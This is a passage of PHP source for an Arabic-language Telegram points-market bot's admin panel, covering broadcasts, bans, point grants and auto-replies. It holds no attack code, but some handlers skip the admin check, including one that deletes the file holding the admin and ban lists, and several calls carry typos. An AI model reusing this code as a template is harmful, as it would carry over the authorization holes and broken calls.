if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"
اهلا بك عزيزي في قسم الاذاعه يمكنك تحكم في الاذاعه عبر الازرار 🤗👇
",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>"اذاعه قنواة 📡",'callback_data'=>"adaanq"]],
[['text'=>'📝 ¦ إرسال رسالة','callback_data'=>"sendmessage"]],
[['text'=>"إذاعة 📣👤",'callback_data'=>'sendprofile'],['text'=>"اذاعه بلتوجيه 🔄",'callback_data'=>"forward"]],
[['text'=>'شرح الاذاعه ضروري تشوفه 📽','callback_data'=>"vid"]],
[["text"=>"رجوع ،🔙","callback_data"=>"c"]],
]])
]);   
}
}
$ch1 = $stingggg['stingggg']['ch1'];
$ch2 = $stingggg['stingggg']['ch2'];
$ch = array($ch1,$ch2);
$yhya = file_get_contents('yhya');
if($data == "adaanq"){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
 'chat_id'=>$chat_id, 
 'message_id'=>$message_id,
 'text'=>"
 قم بإرسال أي شيء حتى أرسله لـالقنوات 
 "
]);
 file_put_contents("yhya",'send');
}
}
if($message and !$data and $yhya == 'send'){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('sendmessage',[
 'chat_id'=>$chat_id, 
 'text'=>"
 تم الاذاعه بنجاح 😌❤️
 ",
'reply_to_message_id'=>$message->message_id, 
 'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙","callback_data"=>"adaan"]],
]])
]);   
if($text){
foreach($ch as $YhyaSyrian){
bot('sendMessage', [
'chat_id'=>$YhyaSyrian,
'text'=>$text,
]); 
}}
if($photo){
foreach($ch as $YhyaSyrian){
bot('sendphoto', [
'chat_id'=>$YhyaSyrian,
'photo'=>$photo_id,
'caption'=>$caption,
]); 
}}
if($cutideo){
foreach($ch as $YhyaSyrian){
bot('Sendvideo',[
'chat_id'=>$YhyaSyrian,
'video'=>$cutideo_id,
'caption'=>$caption,
]); 
}}
if($cutideo_note){
foreach($ch as $YhyaSyrian){
bot('Sendvideonote',[
'chat_id'=>$YhyaSyrian,
'video_note'=>$cutideo_note_id,
]); 
}}
if($sticker){
foreach($ch as $YhyaSyrian){
bot('Sendsticker',[
'chat_id'=>$YhyaSyrian,
'sticker'=>$sticker_id,
]); 
}}
if($file){
foreach($ch as $YhyaSyrian){
bot('SendDocument',[
'chat_id'=>$YhyaSyrian,
'document'=>$file_id,
'caption'=>$caption,
]); 
}}
if($music){
foreach($ch as $YhyaSyrian){
bot('Sendaudio',[
'chat_id'=>$YhyaSyrian,
'audio'=>$music_id,
'caption'=>$caption,
]); 
}}
if($cutoice){
foreach($ch as $YhyaSyrian){
bot('Sendvoice',[
'chat_id'=>$YhyaSyrian,
'voice'=>$cutoice_id,
'caption'=>$caption,
]); 
}}
unlink('yhya');
}
}
if($data == 'sendprofile' or $data == 'forward'){
 if($sting['send']['id'] != null){
  bot('EditMessageText',[
 'chat_id'=>$chat_id, 
 'message_id'=>$message_id,
 'text'=>"
 يجب عليك انتظار إنتهاء الإذاعة العادية /: 🙁
 ",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'adaan']
],
]])
]);
  exit;
 }
}
if($sting['sting']['sting'] == 'send' or $sting['sting']['sting'] == 'forward'){
 if($text and $sting['send']['id'] != null){
   bot('sendmessage',[
 'chat_id'=>$chat_id, 
 'text'=>"
 يجب عليك انتظار إنتهاء الإذاعة العادية /: 🙁
 ",'reply_to_meesage_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'adaan']
],
]])
 ]);
   exit;
  }
 }
if($data == "sendprofile"){
bot('EditMessageText',[
 'chat_id'=>$chat_id, 
 'message_id'=>$message_id,
 'text'=>"
 قم بإرسال أي شيء حتى أرسله لـ $countmembers عضو 👤
 ",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'إلغاء ❎','callback_data'=>'adaan']
],
]])
]);
$sting['sting']['sting'] = 'send';
     $sting['sting']['id'] = $chat_id;
 file_put_contents("sting.json",json_encode($sting,64|128|256));
}
if($message and !$data and $sting['sting']['sting'] == 'send' and $sting['sting']['id'] == $chat_id){
$ms = bot('sendmessage',[
 'chat_id'=>$chat_id, 
 'text'=>"
 جاري بدأ الإذاعة 😌♥️
 ",'reply_to_meesage_id'=>$message_id,
 ])->result->message_id;
$sting['send']['id'] = $ms;
$sting['send']['from'] = $from_id;
$sting['send']['num'] = 0;
if($text){
$sting['send']['method'] = 'text';
$sting['send']['text'] = $text;
}elseif($photo){
$sting['send']['method'] = 'photo';
$sting['send']['file'] = $photo_id;
}elseif($cutideo){
$sting['send']['method'] = 'video';
$sting['send']['file'] = $cutideo_id;
}elseif($cutideo_note){
$sting['send']['method'] = 'video_note';
$sting['send']['file'] = $cutideo_note_id;
}elseif($sticker){
$sting['send']['method'] = 'sticker';
$sting['send']['file'] = $sticker_id;
}elseif($music){
$sting['send']['method'] = 'audio';
$sting['send']['file'] = $audio_id;
}elseif($cutoice){
$sting['send']['method'] = 'voice';
$sting['send']['file'] = $cutoice_id;
}else{
$sting['send']['method'] = 'Document';
$sting['send']['file'] = $file_id;
 }
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
file_put_contents("sting.json",json_encode($sting,64|128|256));
file_get_contents("https://".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
}
if($data == "forward"){
               bot('EditMessageText',[
 'chat_id'=>$chat_id, 
 'message_id'=>$message_id,
 'text'=>"
قم بإرسال أي شيء لأقوم بتوجيهه لجميع الأعضاء 📣
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"adaan"]
],
]])
]);
$sting['sting']['sting'] = 'forward';
$sting['sting']['id'] = $from_id;
 file_put_contents("sting.json",json_encode($sting,64|128|256));
   }
   if(!$data and $sting['sting']['sting'] == 'forward' and $sting['sting']['id'] == $from_id){
 $ms = bot('sendmessage',[
 'chat_id'=>$chat_id, 
 'text'=>"
 جاري بدأ الإذاعة 😌❤️
 ",
 'reply_to_meesage_id'=>$message_id,
])->result->message_id;

$sting['send']['id'] = $ms;
$sting['send']['from'] = $from_id;
$sting['send']['num'] = 0;
$sting['send']['method'] = 'forward';
$sting['send']['mesid'] = $message_id;
$sting['sting']['sting'] = null;
$sting['sting']['id'] = null;
file_put_contents("sting.json",json_encode($sting,64|128|256));
file_get_contents("https://".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
   }
   if($data == "vid"){
   bot('sendvideo',[
   'chat_id'=>$chat_id,
   'video'=>"https://t.me/sysyetefzsryd/17",
   'caption'=>"هاذ شرح للاذاعه يريت تشوفوه ضروري",
   ]);
   }
/*null*/
if($start == null){
$hello =  "🤖» افضل بوت ماركت 😀🔗
❇️» يمكنك جمع نقاط عبر رابط الدعوه الخاص بك او شراء نقاط من المطور 😉";
file_put_contents('start.txt',$hello);
}
if($setengss == null){
file_put_contents("setengss.txt","1");
}
if($setcoin1 == null){
file_put_contents("setcoin1.txt","1");
}
if($hadehday == null){
file_put_contents("hadehday.txt","1");
}
if($ccoin == null){
file_put_contents("ccoin.txt","5");
}
/*>>>>>>>>>>>>>> تعين /start <<<<<<<<<<<<<<<<*/
if ($data =="startjj") {
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
file_put_contents("sting.txt","start1");
bot("EditMessageText",[
"chat_id"=>$chat_id,
'message_id'=>$message_id,
"text"=>"
اهلا عزيزي ارسل الان رسالة ستارت 🙋‍♂️
لطبع الاسم اكتب #name 🙇‍♂️
لطبع النقاط اكتب #points 💰
لطبع الايدي العضو اكتب #id ⛓
لطبع معرف العضو اكتب #user ⚙

مثال 👇
🤖» افضل بوت ماركت 😀🔗
❇️» يمكنك جمع نقاط عبر رابط الدعوه الخاص بك او شراء نقاط من المطور 😉
اسمك #name
معرفك #user
ايديك #id
نقاطك #points
",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙","callback_data"=>"c"]],
]])
]);
}
}
if($text and $sting =="start1"){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
file_put_contents("start.txt","$text"); 
unlink("sting.txt");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"*🙋🏻‍♂️¦تم حفط نص الترحيب هو 
/start
{ $text }*
",
'parse_mode' =>"MARKDOWN",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙","callback_data"=>"c"]],
]])
]);
}
}
/*>>>>>>>>>>>>> قسم الحظر<<<<<<<<<<<<<<<*/
					if($data == "band"){
					if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
								$band = count($stingggg['stingggg']['band']);
								bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
• مرحبا بك في قسم الحظر 👮‍♀️

- يمكنك حظر شخص & الغاء حظر شخص ☣

-معرفة المحظورين 
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"المحظورين 📛  «".$band."»",'callback_data'=>"bander"]
],
[
['text'=>"حظر ➕⛔",'callback_data'=>"bandadd"],['text'=>"إلغاء حظر ➖⛔",'callback_data'=>"delband"]
],
[
['text'=>"مسح المحضورين 🚮🚫",'callback_data'=>"bandajjdd"]
],
[
['text'=>'رجوع 🔙','callback_data'=>'c']
],
]])
]);
$stingggg['stingggg']['stingggg'] = null;
	$stingggg['stingggg']['id'] = null;
	file_put_contents("stingggg.json",json_encode($stingggg));
								}
							}
								if($data == "bandadd" or $data == "delband"){
								if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
									$a = str_replace(['bandadd','delband'],['لأحظره من البوت 📛','لأزيله من المحظورين 😃'],$data);
									bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
أرسل الان ايدي 🆔 الشخص $a 
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"band"]
],
]])
]);
$stingggg['stingggg']['stingggg'] = $data;
$stingggg['stingggg']['id'] = $chat_id;
	file_put_contents("stingggg.json",json_encode($stingggg));
									}
								}
  if($data == "band"){
unset($stingggg['stingggg']['stingggg']);
unset($stingggg['stingggg']['id']);
file_put_contents("stingggg.json",json_encode($stingggg));}
										if($stingggg['stingggg']['stingggg'] == "bandadd" or $stingggg['stingggg']['stingggg'] == "delband"){
									if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
						if($text and $stingggg['stingggg']['id'] == $from_id and $message){
							//if($stingggg['stingggg']['stingggg'] == "bandadd" or $stingggg['stingggg']['stingggg'] == "delband"){
							$a = str_replace(['bandadd','delband'],['حظره بنجاح 😏','إلغاء حظره بنجاح 😴'],$stingggg['stingggg']['stingggg']);
							bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم $a
	",
'reply_to_message_id'=>$message->message_id, 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'رجوع 🔙','callback_data'=>'band']
],
]])
]);
if($stingggg['stingggg']['stingggg'] == "bandadd"){
	$stingggg['stingggg']['band'][] = $text;
	}else{
		foreach($stingggg['stingggg']['band'] as $num => $json){
			if($json == $text){
		unset($stingggg['stingggg']['band'][$num]);
		break;
		}
		}
		}
		$stingggg['stingggg']['stingggg'] = null;
					$stingggg['stingggg']['id'] = null;
	file_put_contents("stingggg.json",json_encode($stingggg));
		}
		}
							}
							
							if($data == "bander"){
							if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
								foreach($stingggg['stingggg']['band'] as $band){
									if($band != null){
									$s .= "`$band` » [للدخول إلى الحساب 🍃](tg://user?id=$band)\n";
									}
}
								bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
إليك قائمة المحظورين 📛
$s
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"band"]
],
]])
]);
								}
							}
 if($data == 'bandajjdd'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'تم حذف جميع المحظورين 🚮🚫 ',
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'العودة','callback_data'=>'band']]
      ]
    ])
  ]);
  unlink('stingggg.json');
  exit;
 }
 /*>>>>>>>>>>>>> قسم النقاط <<<<<<<<<<<<*/
if($data == "sendcoincc"){
   if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
 'text'=> "أرسل عدد النقاط تريد إرسالها الى الجميع ➕💰",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"Nkatn"]
],
]])
]);
   $sales['mode'] = 'poii';
   $cut[$i] = $text;
  save($sales);
  exit;
}
}
  if($data == "Nkatn"){
unset($sales['mode']);
unset($cut[$i]);
save($sales);}
 if($text != '/start' and $text != null and $sales['mode'] == 'poii'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=>"✅ تم ارسال $text نقطة إلى جميع المستخدمين ✨",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
for ($i=0; $i < count($cut); $i++) { 
bot('sendMessage',[
'chat_id'=>$cut[$i],
'text'=>"💰 تم ارسال اليك $text نقاط بواسطة المطور 👩🏻‍💻",
]);
$sales[$cut[$i]]['collect'] += $text;
save($sales);
}
}
}
if($data == "sendcoinxx"){
   if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
 'text'=> "أرسل عدد النقاط تريد خصمها من الجميع ➖💰",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
   $sales['mode'] = 'poiii';
   $cut[$i] = $text;
  save($sales);
  exit;
}
}
  if($data == "Nkatn"){
unset($sales['mode']);
unset($cut[$i]);
save($sales);}
 if($text != '/start' and $text != null and $sales['mode'] == 'poiii'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=>"✅ تم خصم $text نقطة إلى جميع المستخدمين ✨",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
for ($i=0; $i < count($cut); $i++) { 
bot('sendMessage',[
'chat_id'=>$cut[$i],
'text'=>"💰 تم خصم $text نقاط بواسطة المطور 👩🏻‍💻",
]);
$sales[$cut[$i]]['collect'] -= $text;
save($sales);
}
}
}

//Bot File Share by [ @Sherif_Sami - @php_d - @BlIJJ ]
//Join Channel >>> @Sherif_World
//Join Channel >>> @M_M_D74
//🚷

if($data == "sendcoin"){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
   'text'=>"أرسل أيدي الشخص الذي تريد إرسال النقاط له 🧸",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
  $sales['mode'] = 'chat';
  save($sales);
  exit;
  }
 }
 if($data == "Nkatn"){
unset($sales['mode']);
save($sales);
}
   if($text != '/start' and $text != null and $sales['mode'] == 'chat'){
   if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=> "أرسل عدد النقاط تريد إرسالها 💰",
 'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
   $sales['mode'] = 'poi';
   $sales['idd'] = $text;
  save($sales);
  exit;
}
}
 if($data == "Nkatn"){
unset($sales['mode']);
unset($sales['idd']);
save($sales);
}
 if($text != '/start' and $text != null and $sales['mode'] == 'poi'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=>"تم إضافة $text نقطة إلى حساب ".$sales['idd']." بنجاح ",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
  bot('sendmessage',[
   'chat_id'=>$sales['idd'],
  'text'=>"✅ ¦ لقد ربحت « $text » نقطة 💰
🧑🏻‍💻 ¦ من الإدارة 👮🏻‍♂️",
  ]);
  $sales['mode'] = null;
  $sales[$sales['idd']]['collect'] += $text;
  $sales['idd'] = null;
  save($sales);
  exit;
}
}
if($data == "takecoin"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
   'text'=>"أرسل أيدي الشخص الذي تريد خصم النقاط منه",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
  $sales['mode'] = 'chat1';
  save($sales);
  exit;
  }
 }
  if($data == "Nkatn"){
unset($sales['mode']);
save($sales);
}
   if($text != '/start' and $text != null and $sales['mode'] == 'chat1'){
    if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=> "أرسل الكمية التي تريد خصمها",
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
   $sales['mode'] = 'poi1';
   $sales['idd'] = $text;
  save($sales);
  exit;
}
}
 if($data == "Nkatn"){
unset($sales['mode']);
unset($sales['idd']);
save($sales);
}
 if($text != '/start' and $text != null and $sales['mode'] == 'poi1'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
 'text'=>"تم خصم $text نقطة من حساب ".$sales['idd']." بنجاح ",
 'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"Nkatn"]],
]])
]);   
  bot('sendmessage',[
   'chat_id'=>$sales['idd'],
  'text'=>"📛 ¦ تم خصم « $text » نقطة 💰
🧑🏻‍💻 ¦ من الإدارة 👮🏻‍♂",
  ]);
  $sales['mode'] = null;
  $sales[$sales['idd']]['collect'] -= $text;
  $sales['idd'] = null;
  save($sales);
  exit;
}
}
if($data == "setcoin1" ){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"▪ ارسل عدد النقاط التي تريد ان يكسبها العضو عند الاشتراك في قناة التمويل
(ارقام فقط) $type",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);   
$sales['mode'] = 'coc1';
save($sales);
exit;
}
}
 if($data == "stengbott"){
unset($sales['mode']);
save($sales);
}
 if($text != '/start' and $text != null and $sales['mode'] == 'coc1'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'تم الحفظ ✅. ',
'reply_to_message_id'=>$message->message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
file_put_contents("setcoin1.txt","$text");
$sales['mode'] = null;
save($sales);
exit;
}
}
  if($data == 'setengss'){
   if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"ارسل الان عدد نقاط الدخول (ارقام فقط)",
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'إلغاء الأمر ❌','callback_data'=>'Nkatn']]
      ]
    ])
  ]);
file_put_contents("setengss.txt","ok");
 }
}
  if($data == "Nkatn"){
file_put_contents("setengss.txt");
}
if($text and $setengss == "ok"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم تعين عدد نقاط الدخول ",
'reply_to_message_id'=>$message->message_id, 
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'رجوع 🔙','callback_data'=>'Nkatn']]
      ]
    ])
  ]);
unlink('setengss.txt');
file_put_contents("setengss.txt","$text");
 }
}
  if($data == 'hadehday'){
   if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"ارسل الان عدد نقاط الهديه اليوميه (ارقام فقط)",
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'إلغاء الأمر ❌','callback_data'=>'Nkatn']]
      ]
    ])
  ]);
file_put_contents("hadehday.txt","ok");
  }
 }
  if($data == "Nkatn"){
file_put_contents("hadehday.txt");
}
if($text and $hadehday == "ok"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم تعين عدد نقاط الهديه اليوميه 🔗👑 ",
'reply_to_message_id'=>$message->message_id, 
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'رجوع 🔙','callback_data'=>'Nkatn']]
      ]
    ])
  ]);
unlink('hadehday.txt');
file_put_contents("hadehday.txt","$text");
 }
}
if($data == 'ccoin'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"اهلا عزيزي الان ارسل عدد نقاط تحويل ",
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'إلغاء الأمر ❌','callback_data'=>'Nkatn']]
      ]
    ])
  ]);
file_put_contents("ccoin.txt","ok");
 }
}
  if($data == "Nkatn"){
file_put_contents("ccoin.txt");
}
if($text and $ccoin == "ok"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم تعين عدد نقاط تحويل ✅",
'reply_to_message_id'=>$message->message_id, 
      'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'رجوع 🔙','callback_data'=>'Nkatn']]
      ]
    ])
  ]);
file_put_contents("ccoin.txt","$text");
 }
}



function rdod($array){
file_put_contents('rdod.json', json_encode($array,64|128|256));
}
$rdod = json_decode(file_get_contents('rdod.json'),1);
if(isset($update->message)){
$message = $update->message;
$text = $message->text;
$photo = $message->photo[0]->file_id;
$cutideo = $message->video->file_id;
$cutoice = $message->voice->file_id;
$audio = $message->audio->file_id;
$sticker = $message->sticker->file_id;
$cutideo_note = $message->video_note->file_id;
$contact = $message->contact->phone_number;
$document = $message->document->file_id;
$caption = $message->caption;
}
if($data == "addrd"){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
	'chat_id'=>$chat_id, 
	'message_id'=>$message_id,
	'text'=>"
قم بإرسال الكلمة الأن 📪
",'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"إلغاء ❎",'callback_data'=>"rdod"]
],
]])
]);
$rdod['id'] = $from_id;
rdod($rdod);
}
}
if($data == "rdod"){
unset($rdod['id']);
rdod($rdod);}
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
if($message and $rdod['id'] == $from_id and $rdod['txt'] == null){
bot("SendMessage",[
 "chat_id"=>$chat_id,
 "text"=>"
 تم حفظ الكلمه 😃
 قم بإرسال أي شي الأن 😉 ليصبح رداً 😌
 ",
 'reply_to_message_id'=>$message->message_id, 
 ]);
 $rdod['txt'] = $text;
 rdod($rdod);
 exit;
}
}
if($message and $rdod['id'] == $from_id and $rdod['txt'] != null){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
if($text){
$rdod['rd'][$rdod['txt']]['text'] = $text;
}elseif($photo){
$rdod['rd'][$rdod['txt']]['photo'] = $photo;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}elseif($cutideo){
$rdod['rd'][$rdod['txt']]['video'] = $cutideo;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}elseif($cutoice){
$rdod['rd'][$rdod['txt']]['voice'] = $cutoice;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}elseif($audio){
$rdod['rd'][$rdod['txt']]['audio'] = $audio;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}elseif($sticker){
$rdod['rd'][$rdod['txt']]['sticker'] = $sticker;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}elseif($cutideo_note){
$rdod['rd'][$rdod['txt']]['video_note'] = $cutideo_note;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}elseif($contact){
$rdod['rd'][$rdod['txt']]['contact'] = $contact;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}elseif($animation){
$rdod['rd'][$rdod['txt']]['animation'] = $animation;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}else{
$rdod['rd'][$rdod['txt']]['document'] = $document;
$rdod['rd'][$rdod['txt']]['caption'] = $caption;
}
bot("SendMessage",[
 "chat_id"=>$chat_id,
 "text"=>"
تم حفظ الرد بنجاح ✓
 ",
 'reply_to_message_id'=>$message->message_id, 
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>"رجوع 🔙",'callback_data'=>"rdod"]
],
]])
]);
unset($rdod['id']);unset($rdod['txt']);
rdod($rdod);
}
}
if($rdod['rd'][$text] and $stingggg['alrdod'] == 'on'){
	foreach($rdod['rd'][$text] as $key => $cutalue){
		if($key == 'text' and $stingggg['alrdod'] == 'on'){
			bot("SendMessage",[
 "chat_id"=>$chat_id,
 "text"=>$cutalue,
 'reply_to_message_id'=>$message->message_id, 
 ]);
			}elseif($key == 'contact' and $stingggg['alrdod'] == 'on'){
				bot("Send".str_replace('_','',$key),[
				'caht_id'=>$chat_id,
				'phone_number'=>$cutalue,
				'first_name'=>$message->from->first_name,
'last_name'=>$message->from->last_name,
'reply_to_message_id'=>$message->message_id,
]);
			}else{
				bot("Send".str_replace('_','',$key),[
 "chat_id"=>$chat_id,
 $key=>$cutalue,
'caption'=>$rdod['rd'][$text]['caption'],
 'reply_to_message_id'=>$message->message_id, 
 ]);
				}
		}
	}

if($data == "Rdod"){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'الرد','callback_data'=>'s'],['text'=>'🗑️','callback_data'=>'s']];
	foreach($rdod['rd'] as $key => $cutalue){
		$reply_markup['inline_keyboard'][] = [['text'=>$key,'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>"delrd×".$key]];
		}
		  $reply_markup['inline_keyboard'][] = [['text'=>'رجوع 🔙','callback_data'=>'rdod']];
$json = json_encode($reply_markup);
bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
تفضل عزيزي قائمة الردود
",reply_markup=>($json)]);
	}
	}
	$ex = explode('×',$data);
	if($ex[0] == "delrd"){
		unset($rdod['rd'][$ex[1]]);
		rdod($rdod);
		$rdod = json_decode(file_get_contents('rdod.json'),1);
		$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'الرد','callback_data'=>'s'],['text'=>'🗑️','callback_data'=>'s']];
	foreach($rdod['rd'] as $key => $cutalue){
		$reply_markup['inline_keyboard'][] = [['text'=>$key,'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>"delrd×".$key]];
		}
		  $reply_markup['inline_keyboard'][] = [['text'=>'رجوع 🔙','callback_data'=>'rdod']];
$json = json_encode($reply_markup);
		bot('EditMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$message_id,
  'text'=>"
  تم حذف الرد بنجاح✓.
تفضل عزيزي قائمة الردود
",reply_markup=>($json)]);
		}

if($data == "delchannel"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"🙂 تم حذف قناة التمويل بنجاح",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
unlink("channels.txt");
unlink("getmosh.txt");
$sales['mode'] = null;
save($sales);
exit;
 }
 }
#حذف قناة 2
 if($data == "delchannel2"){
